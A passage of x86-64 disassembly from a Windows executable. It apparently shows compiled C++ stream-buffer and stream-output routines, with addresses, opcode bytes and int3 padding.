   140004829:	48 63 10             	movslq (%rax),%rdx
   14000482c:	48 03 d1             	add    %rcx,%rdx
   14000482f:	48 3b ca             	cmp    %rdx,%rcx
   140004832:	73 09                	jae    0x14000483d
   140004834:	0f b6 01             	movzbl (%rcx),%eax
   140004837:	48 83 c4 20          	add    $0x20,%rsp
   14000483b:	5b                   	pop    %rbx
   14000483c:	c3                   	ret
   14000483d:	48 8b 03             	mov    (%rbx),%rax
   140004840:	48 8b cb             	mov    %rbx,%rcx
   140004843:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140004848:	ff 50 38             	call   *0x38(%rax)
   14000484b:	8b f8                	mov    %eax,%edi
   14000484d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004850:	75 0b                	jne    0x14000485d
   140004852:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140004857:	48 83 c4 20          	add    $0x20,%rsp
   14000485b:	5b                   	pop    %rbx
   14000485c:	c3                   	ret
   14000485d:	48 8b 03             	mov    (%rbx),%rax
   140004860:	8b d7                	mov    %edi,%edx
   140004862:	48 8b cb             	mov    %rbx,%rcx
   140004865:	ff 50 20             	call   *0x20(%rax)
   140004868:	8b c7                	mov    %edi,%eax
   14000486a:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   14000486f:	48 83 c4 20          	add    $0x20,%rsp
   140004873:	5b                   	pop    %rbx
   140004874:	c3                   	ret
   140004875:	cc                   	int3
   140004876:	cc                   	int3
   140004877:	cc                   	int3
   140004878:	cc                   	int3
   140004879:	cc                   	int3
   14000487a:	cc                   	int3
   14000487b:	cc                   	int3
   14000487c:	cc                   	int3
   14000487d:	cc                   	int3
   14000487e:	cc                   	int3
   14000487f:	cc                   	int3
   140004880:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004885:	57                   	push   %rdi
   140004886:	48 83 ec 20          	sub    $0x20,%rsp
   14000488a:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000488e:	48 8b d9             	mov    %rcx,%rbx
   140004891:	8b fa                	mov    %edx,%edi
   140004893:	48 8b 08             	mov    (%rax),%rcx
   140004896:	48 85 c9             	test   %rcx,%rcx
   140004899:	74 38                	je     0x1400048d3
   14000489b:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000489f:	48 39 08             	cmp    %rcx,(%rax)
   1400048a2:	73 2f                	jae    0x1400048d3
   1400048a4:	83 fa ff             	cmp    $0xffffffff,%edx
   1400048a7:	74 08                	je     0x1400048b1
   1400048a9:	0f b6 41 ff          	movzbl -0x1(%rcx),%eax
   1400048ad:	3b c2                	cmp    %edx,%eax
   1400048af:	75 22                	jne    0x1400048d3
   1400048b1:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400048b5:	ff 00                	incl   (%rax)
   1400048b7:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400048bb:	48 ff 08             	decq   (%rax)
   1400048be:	33 c0                	xor    %eax,%eax
   1400048c0:	83 ff ff             	cmp    $0xffffffff,%edi
   1400048c3:	0f 44 f8             	cmove  %eax,%edi
   1400048c6:	8b c7                	mov    %edi,%eax
   1400048c8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400048cd:	48 83 c4 20          	add    $0x20,%rsp
   1400048d1:	5f                   	pop    %rdi
   1400048d2:	c3                   	ret
   1400048d3:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   1400048da:	48 85 d2             	test   %rdx,%rdx
   1400048dd:	74 72                	je     0x140004951
   1400048df:	83 ff ff             	cmp    $0xffffffff,%edi
   1400048e2:	74 6d                	je     0x140004951
   1400048e4:	48 83 7b 68 00       	cmpq   $0x0,0x68(%rbx)
   1400048e9:	75 0e                	jne    0x1400048f9
   1400048eb:	40 0f b6 cf          	movzbl %dil,%ecx
   1400048ef:	e8 04 ab 00 00       	call   0x14000f3f8
   1400048f4:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400048f7:	75 cd                	jne    0x1400048c6
   1400048f9:	4c 8b 43 38          	mov    0x38(%rbx),%r8
   1400048fd:	48 8d 53 70          	lea    0x70(%rbx),%rdx
   140004901:	49 39 10             	cmp    %rdx,(%r8)
   140004904:	74 4b                	je     0x140004951
   140004906:	4c 8b 53 18          	mov    0x18(%rbx),%r10
   14000490a:	4c 8d 4b 50          	lea    0x50(%rbx),%r9
   14000490e:	40 88 3a             	mov    %dil,(%rdx)
   140004911:	49 8b 02             	mov    (%r10),%rax
   140004914:	48 3b c2             	cmp    %rdx,%rax
   140004917:	74 17                	je     0x140004930
   140004919:	48 89 83 88 00 00 00 	mov    %rax,0x88(%rbx)
   140004920:	49 8b 01             	mov    (%r9),%rax
   140004923:	48 63 08             	movslq (%rax),%rcx
   140004926:	49 03 08             	add    (%r8),%rcx
   140004929:	48 89 8b 90 00 00 00 	mov    %rcx,0x90(%rbx)
   140004930:	49 89 12             	mov    %rdx,(%r10)
   140004933:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140004937:	2b da                	sub    %edx,%ebx
   140004939:	83 c3 71             	add    $0x71,%ebx
   14000493c:	48 89 10             	mov    %rdx,(%rax)
   14000493f:	49 8b 01             	mov    (%r9),%rax
   140004942:	89 18                	mov    %ebx,(%rax)
   140004944:	8b c7                	mov    %edi,%eax
   140004946:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000494b:	48 83 c4 20          	add    $0x20,%rsp
   14000494f:	5f                   	pop    %rdi
   140004950:	c3                   	ret
   140004951:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004956:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000495b:	48 83 c4 20          	add    $0x20,%rsp
   14000495f:	5f                   	pop    %rdi
   140004960:	c3                   	ret
   140004961:	cc                   	int3
   140004962:	cc                   	int3
   140004963:	cc                   	int3
   140004964:	cc                   	int3
   140004965:	cc                   	int3
   140004966:	cc                   	int3
   140004967:	cc                   	int3
   140004968:	cc                   	int3
   140004969:	cc                   	int3
   14000496a:	cc                   	int3
   14000496b:	cc                   	int3
   14000496c:	cc                   	int3
   14000496d:	cc                   	int3
   14000496e:	cc                   	int3
   14000496f:	cc                   	int3
   140004970:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140004975:	57                   	push   %rdi
   140004976:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000497d:	48 8b 05 fc 56 03 00 	mov    0x356fc(%rip),%rax        # 0x14003a080
   140004984:	48 33 c4             	xor    %rsp,%rax
   140004987:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000498c:	8b fa                	mov    %edx,%edi
   14000498e:	48 8b d9             	mov    %rcx,%rbx
   140004991:	83 fa ff             	cmp    $0xffffffff,%edx
   140004994:	75 07                	jne    0x14000499d
   140004996:	33 c0                	xor    %eax,%eax
   140004998:	e9 4e 01 00 00       	jmp    0x140004aeb
   14000499d:	48 8b 41 40          	mov    0x40(%rcx),%rax
   1400049a1:	48 8b 10             	mov    (%rax),%rdx
   1400049a4:	48 85 d2             	test   %rdx,%rdx
   1400049a7:	74 2e                	je     0x1400049d7
   1400049a9:	48 8b 41 58          	mov    0x58(%rcx),%rax
   1400049ad:	4c 63 00             	movslq (%rax),%r8
   1400049b0:	4a 8d 0c 02          	lea    (%rdx,%r8,1),%rcx
   1400049b4:	48 3b d1             	cmp    %rcx,%rdx
   1400049b7:	73 1e                	jae    0x1400049d7
   1400049b9:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   1400049bd:	89 08                	mov    %ecx,(%rax)
   1400049bf:	8b c7                	mov    %edi,%eax
   1400049c1:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   1400049c5:	4c 8b 02             	mov    (%rdx),%r8
   1400049c8:	49 8d 48 01          	lea    0x1(%r8),%rcx
   1400049cc:	48 89 0a             	mov    %rcx,(%rdx)
   1400049cf:	41 88 38             	mov    %dil,(%r8)
   1400049d2:	e9 14 01 00 00       	jmp    0x140004aeb
   1400049d7:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   1400049de:	00 
   1400049df:	48 89 b4 24 a0 00 00 	mov    %rsi,0xa0(%rsp)
   1400049e6:	00 
   1400049e7:	0f 84 f1 00 00 00    	je     0x140004ade
   1400049ed:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   1400049f1:	48 8d 43 70          	lea    0x70(%rbx),%rax
   1400049f5:	49 39 00             	cmp    %rax,(%r8)
   1400049f8:	75 20                	jne    0x140004a1a
   1400049fa:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140004a01:	48 8b 93 90 00 00 00 	mov    0x90(%rbx),%rdx
   140004a08:	49 89 08             	mov    %rcx,(%r8)
   140004a0b:	2b d1                	sub    %ecx,%edx
   140004a0d:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140004a11:	48 89 08             	mov    %rcx,(%rax)
   140004a14:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140004a18:	89 10                	mov    %edx,(%rax)
   140004a1a:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140004a1e:	48 85 c9             	test   %rcx,%rcx
   140004a21:	75 06                	jne    0x140004a29
   140004a23:	40 0f be cf          	movsbl %dil,%ecx
   140004a27:	eb 54                	jmp    0x140004a7d
   140004a29:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140004a2e:	40 88 7c 24 50       	mov    %dil,0x50(%rsp)
   140004a33:	48 8b 01             	mov    (%rcx),%rax
   140004a36:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140004a3a:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   140004a3f:	4c 8d 4c 24 51       	lea    0x51(%rsp),%r9
   140004a44:	4c 8d 44 24 78       	lea    0x78(%rsp),%r8
   140004a49:	4c 89 44 24 30       	mov    %r8,0x30(%rsp)
   140004a4e:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140004a53:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140004a58:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   140004a5d:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140004a62:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140004a67:	ff 50 38             	call   *0x38(%rax)
   140004a6a:	85 c0                	test   %eax,%eax
   140004a6c:	74 29                	je     0x140004a97
   140004a6e:	83 e8 01             	sub    $0x1,%eax
   140004a71:	74 24                	je     0x140004a97
   140004a73:	83 f8 02             	cmp    $0x2,%eax
   140004a76:	75 66                	jne    0x140004ade
   140004a78:	0f be 4c 24 50       	movsbl 0x50(%rsp),%ecx
   140004a7d:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   140004a84:	e8 9b 8f 00 00       	call   0x14000da24
   140004a89:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140004a8e:	3b c1                	cmp    %ecx,%eax
   140004a90:	0f 45 cf             	cmovne %edi,%ecx
   140004a93:	8b c1                	mov    %ecx,%eax
   140004a95:	eb 4c                	jmp    0x140004ae3
   140004a97:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004a9c:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140004aa1:	48 2b f0             	sub    %rax,%rsi
   140004aa4:	74 1e                	je     0x140004ac4
   140004aa6:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   140004aad:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140004ab2:	4c 8b c6             	mov    %rsi,%r8
   140004ab5:	ba 01 00 00 00       	mov    $0x1,%edx
   140004aba:	e8 49 a4 00 00       	call   0x14000ef08
   140004abf:	48 3b f0             	cmp    %rax,%rsi
   140004ac2:	75 1a                	jne    0x140004ade
   140004ac4:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140004ac9:	c6 43 71 01          	movb   $0x1,0x71(%rbx)
   140004acd:	48 39 44 24 48       	cmp    %rax,0x48(%rsp)
   140004ad2:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140004ad7:	0f 45 cf             	cmovne %edi,%ecx
   140004ada:	8b c1                	mov    %ecx,%eax
   140004adc:	eb 05                	jmp    0x140004ae3
   140004ade:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004ae3:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140004aea:	00 
   140004aeb:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140004af0:	48 33 cc             	xor    %rsp,%rcx
   140004af3:	e8 b8 39 00 00       	call   0x1400084b0
   140004af8:	48 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%rbx
   140004aff:	00 
   140004b00:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140004b07:	5f                   	pop    %rdi
   140004b08:	c3                   	ret
   140004b09:	cc                   	int3
   140004b0a:	cc                   	int3
   140004b0b:	cc                   	int3
   140004b0c:	cc                   	int3
   140004b0d:	cc                   	int3
   140004b0e:	cc                   	int3
   140004b0f:	cc                   	int3
   140004b10:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140004b17:	48 85 c9             	test   %rcx,%rcx
   140004b1a:	0f 85 6c a0 00 00    	jne    0x14000eb8c
   140004b20:	c3                   	ret
   140004b21:	cc                   	int3
   140004b22:	cc                   	int3
   140004b23:	cc                   	int3
   140004b24:	cc                   	int3
   140004b25:	cc                   	int3
   140004b26:	cc                   	int3
   140004b27:	cc                   	int3
   140004b28:	cc                   	int3
   140004b29:	cc                   	int3
   140004b2a:	cc                   	int3
   140004b2b:	cc                   	int3
   140004b2c:	cc                   	int3
   140004b2d:	cc                   	int3
   140004b2e:	cc                   	int3
   140004b2f:	cc                   	int3
   140004b30:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140004b37:	48 85 c9             	test   %rcx,%rcx
   140004b3a:	0f 85 40 a0 00 00    	jne    0x14000eb80
   140004b40:	c3                   	ret
   140004b41:	cc                   	int3
   140004b42:	cc                   	int3
   140004b43:	cc                   	int3
   140004b44:	cc                   	int3
   140004b45:	cc                   	int3
   140004b46:	cc                   	int3
   140004b47:	cc                   	int3
   140004b48:	cc                   	int3
   140004b49:	cc                   	int3
   140004b4a:	cc                   	int3
   140004b4b:	cc                   	int3
   140004b4c:	cc                   	int3
   140004b4d:	cc                   	int3
   140004b4e:	cc                   	int3
   140004b4f:	cc                   	int3
   140004b50:	40 53                	rex push %rbx
   140004b52:	48 83 ec 20          	sub    $0x20,%rsp
   140004b56:	48 8b d9             	mov    %rcx,%rbx
   140004b59:	48 8d 05 f8 ff 02 00 	lea    0x2fff8(%rip),%rax        # 0x140034b58
   140004b60:	48 89 01             	mov    %rax,(%rcx)
   140004b63:	48 83 b9 80 00 00 00 	cmpq   $0x0,0x80(%rcx)
   140004b6a:	00 
   140004b6b:	74 2f                	je     0x140004b9c
   140004b6d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140004b71:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140004b75:	48 39 01             	cmp    %rax,(%rcx)
   140004b78:	75 22                	jne    0x140004b9c
   140004b7a:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   140004b81:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140004b88:	48 89 11             	mov    %rdx,(%rcx)
   140004b8b:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140004b8f:	48 89 10             	mov    %rdx,(%rax)
   140004b92:	44 2b c2             	sub    %edx,%r8d
   140004b95:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140004b99:	44 89 00             	mov    %r8d,(%rax)
   140004b9c:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140004ba0:	74 08                	je     0x140004baa
   140004ba2:	48 8b cb             	mov    %rbx,%rcx
   140004ba5:	e8 56 0f 00 00       	call   0x140005b00
   140004baa:	48 8d 05 17 ff 02 00 	lea    0x2ff17(%rip),%rax        # 0x140034ac8
   140004bb1:	48 89 03             	mov    %rax,(%rbx)
   140004bb4:	48 8b 5b 60          	mov    0x60(%rbx),%rbx
   140004bb8:	48 85 db             	test   %rbx,%rbx
   140004bbb:	74 34                	je     0x140004bf1
   140004bbd:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140004bc1:	48 85 c9             	test   %rcx,%rcx
   140004bc4:	74 19                	je     0x140004bdf
   140004bc6:	48 8b 01             	mov    (%rcx),%rax
   140004bc9:	ff 50 10             	call   *0x10(%rax)
   140004bcc:	48 85 c0             	test   %rax,%rax
   140004bcf:	74 0e                	je     0x140004bdf
   140004bd1:	4c 8b 00             	mov    (%rax),%r8
   140004bd4:	ba 01 00 00 00       	mov    $0x1,%edx
   140004bd9:	48 8b c8             	mov    %rax,%rcx
   140004bdc:	41 ff 10             	call   *(%r8)
   140004bdf:	ba 10 00 00 00       	mov    $0x10,%edx
   140004be4:	48 8b cb             	mov    %rbx,%rcx
   140004be7:	48 83 c4 20          	add    $0x20,%rsp
   140004beb:	5b                   	pop    %rbx
   140004bec:	e9 23 39 00 00       	jmp    0x140008514
   140004bf1:	48 83 c4 20          	add    $0x20,%rsp
   140004bf5:	5b                   	pop    %rbx
   140004bf6:	c3                   	ret
   140004bf7:	cc                   	int3
   140004bf8:	cc                   	int3
   140004bf9:	cc                   	int3
   140004bfa:	cc                   	int3
   140004bfb:	cc                   	int3
   140004bfc:	cc                   	int3
   140004bfd:	cc                   	int3
   140004bfe:	cc                   	int3
   140004bff:	cc                   	int3
   140004c00:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004c05:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004c0a:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004c0f:	57                   	push   %rdi
   140004c10:	41 56                	push   %r14
   140004c12:	41 57                	push   %r15
   140004c14:	48 83 ec 70          	sub    $0x70,%rsp
   140004c18:	4d 8b f0             	mov    %r8,%r14
   140004c1b:	4c 8b fa             	mov    %rdx,%r15
   140004c1e:	48 8b d9             	mov    %rcx,%rbx
   140004c21:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140004c26:	48 8b 01             	mov    (%rcx),%rax
   140004c29:	4c 63 48 04          	movslq 0x4(%rax),%r9
   140004c2d:	49 8b 4c 09 48       	mov    0x48(%r9,%rcx,1),%rcx
   140004c32:	48 85 c9             	test   %rcx,%rcx
   140004c35:	74 07                	je     0x140004c3e
   140004c37:	48 8b 01             	mov    (%rcx),%rax
   140004c3a:	ff 50 08             	call   *0x8(%rax)
   140004c3d:	90                   	nop
   140004c3e:	48 8b 0b             	mov    (%rbx),%rcx
   140004c41:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140004c45:	83 7c 18 10 00       	cmpl   $0x0,0x10(%rax,%rbx,1)
   140004c4a:	74 09                	je     0x140004c55
   140004c4c:	c6 44 24 28 00       	movb   $0x0,0x28(%rsp)
   140004c51:	32 c0                	xor    %al,%al
   140004c53:	eb 33                	jmp    0x140004c88
   140004c55:	48 8b 44 18 50       	mov    0x50(%rax,%rbx,1),%rax
   140004c5a:	48 85 c0             	test   %rax,%rax
   140004c5d:	74 22                	je     0x140004c81
   140004c5f:	48 3b c3             	cmp    %rbx,%rax
   140004c62:	74 1d                	je     0x140004c81
   140004c64:	48 8b c8             	mov    %rax,%rcx
   140004c67:	e8 04 12 00 00       	call   0x140005e70
   140004c6c:	48 8b 0b             	mov    (%rbx),%rcx
   140004c6f:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140004c73:	83 7c 18 10 00       	cmpl   $0x0,0x10(%rax,%rbx,1)
   140004c78:	0f 94 c0             	sete   %al
   140004c7b:	88 44 24 28          	mov    %al,0x28(%rsp)
   140004c7f:	eb 07                	jmp    0x140004c88
   140004c81:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   140004c86:	b0 01                	mov    $0x1,%al
   140004c88:	33 f6                	xor    %esi,%esi
   140004c8a:	84 c0                	test   %al,%al
   140004c8c:	75 09                	jne    0x140004c97
   140004c8e:	ba 04 00 00 00       	mov    $0x4,%edx
   140004c93:	8b fa                	mov    %edx,%edi
   140004c95:	eb 4d                	jmp    0x140004ce4
   140004c97:	8b fe                	mov    %esi,%edi
   140004c99:	89 b4 24 a8 00 00 00 	mov    %esi,0xa8(%rsp)
   140004ca0:	4d 85 f6             	test   %r14,%r14
   140004ca3:	7e 3a                	jle    0x140004cdf
   140004ca5:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140004ca9:	48 8b 4c 18 48       	mov    0x48(%rax,%rbx,1),%rcx
   140004cae:	48 8b 01             	mov    (%rcx),%rax
   140004cb1:	4d 8b c6             	mov    %r14,%r8
   140004cb4:	49 8b d7             	mov    %r15,%rdx
   140004cb7:	ff 50 48             	call   *0x48(%rax)
   140004cba:	ba 04 00 00 00       	mov    $0x4,%edx
   140004cbf:	49 3b c6             	cmp    %r14,%rax
   140004cc2:	0f 45 fa             	cmovne %edx,%edi
   140004cc5:	89 bc 24 a8 00 00 00 	mov    %edi,0xa8(%rsp)
   140004ccc:	eb 16                	jmp    0x140004ce4
   140004cce:	33 f6                	xor    %esi,%esi
   140004cd0:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   140004cd7:	00 
   140004cd8:	8b bc 24 a8 00 00 00 	mov    0xa8(%rsp),%edi
   140004cdf:	ba 04 00 00 00       	mov    $0x4,%edx
   140004ce4:	48 8b 03             	mov    (%rbx),%rax
   140004ce7:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004ceb:	48 83 7c 19 48 00    	cmpq   $0x0,0x48(%rcx,%rbx,1)
   140004cf1:	0f 45 d6             	cmovne %esi,%edx
   140004cf4:	0b 54 19 10          	or     0x10(%rcx,%rbx,1),%edx
   140004cf8:	0b d7                	or     %edi,%edx
   140004cfa:	83 e2 17             	and    $0x17,%edx
   140004cfd:	89 54 19 10          	mov    %edx,0x10(%rcx,%rbx,1)
   140004d01:	23 54 19 14          	and    0x14(%rcx,%rbx,1),%edx
   140004d05:	75 43                	jne    0x140004d4a
   140004d07:	e8 28 2b 00 00       	call   0x140007834
   140004d0c:	85 c0                	test   %eax,%eax
   140004d0e:	75 09                	jne    0x140004d19
   140004d10:	48 8b cb             	mov    %rbx,%rcx
   140004d13:	e8 58 19 00 00       	call   0x140006670
   140004d18:	90                   	nop
   140004d19:	48 8b 03             	mov    (%rbx),%rax
   140004d1c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140004d20:	48 8b 4c 19 48       	mov    0x48(%rcx,%rbx,1),%rcx
   140004d25:	48 85 c9             	test   %rcx,%rcx
   140004d28:	74 07                	je     0x140004d31
   140004d2a:	48 8b 01             	mov    (%rcx),%rax
   140004d2d:	ff 50 10             	call   *0x10(%rax)
   140004d30:	90                   	nop
   140004d31:	48 8b c3             	mov    %rbx,%rax
   140004d34:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004d39:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140004d3d:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140004d41:	49 8b e3             	mov    %r11,%rsp
   140004d44:	41 5f                	pop    %r15
   140004d46:	41 5e                	pop    %r14
   140004d48:	5f                   	pop    %rdi
   140004d49:	c3                   	ret
   140004d4a:	f6 c2 04             	test   $0x4,%dl
   140004d4d:	74 09                	je     0x140004d58
   140004d4f:	48 8d 1d 82 fa 02 00 	lea    0x2fa82(%rip),%rbx        # 0x1400347d8
   140004d56:	eb 15                	jmp    0x140004d6d
   140004d58:	f6 c2 02             	test   $0x2,%dl
   140004d5b:	48 8d 1d 8e fa 02 00 	lea    0x2fa8e(%rip),%rbx        # 0x1400347f0
   140004d62:	48 8d 05 9f fa 02 00 	lea    0x2fa9f(%rip),%rax        # 0x140034808
   140004d69:	48 0f 44 d8          	cmove  %rax,%rbx
   140004d6d:	ba 01 00 00 00       	mov    $0x1,%edx
